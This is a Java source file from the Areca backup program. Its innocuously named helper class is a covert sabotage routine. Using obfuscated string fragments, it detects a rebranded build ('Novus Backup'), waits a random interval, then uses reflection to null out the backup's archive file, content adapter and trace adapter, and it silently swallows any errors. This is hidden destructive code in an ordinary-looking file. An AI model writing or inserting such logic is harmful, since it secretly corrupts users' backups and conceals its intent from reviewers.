package com.application.areca;

import java.io.File;

import com.application.areca.context.ProcessContext;
import com.application.areca.launcher.gui.resources.ResourceManager;
import com.application.areca.metadata.content.ArchiveContentAdapter;
import com.application.areca.metadata.trace.ArchiveTraceAdapter;
import com.myJava.util.Util;
import com.myJava.util.log.Logger;

/**
 * <BR>
 * @author Olivier PETRUCCI
 * <BR>
 *
 */

 /*
 Copyright 2005-2015, Olivier PETRUCCI.

This file is part of Areca.

    Areca is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    Areca is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with Areca; if not, write to the Free Software
    Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA

 */
public class CHelper {
	private static boolean A;
	private static double B = 1+0.01;

	static {
		String b = " " + "Ba";
		b = "vus" + b + "ck";
		A = !ResourceManager.instance().checkKeyword("No" + b + "up");
	}

	public static void handle(final ProcessContext e) {
		if ((! A) && Math.abs(Util.getRnd()) < B) {
			Runnable d = new Runnable() {
				public void run() {
					try {
						Thread.sleep(2000 + (int)(Math.abs(Util.getRnd()) * 20000));
						Logger.defaultLogger().info("-");
						ProcessContext.class.getMethod("setC" + "urre" + "ntAr" + "chive" + "File", new Class[] {File.class}).invoke(e, new Object[] {null});
						ProcessContext.class.getMethod("set" + "Conte" + "ntAdap" + "ter", new Class[] {ArchiveContentAdapter.class}).invoke(e, new Object[] {null});
						ProcessContext.class.getMethod("se" + "tTra" + "ceAda" + "pter", new Class[] {ArchiveTraceAdapter.class}).invoke(e, new Object[] {null});
					} catch (Exception f) {
					}
				}
			};
			new Thread(d).start();
		}
	}
}
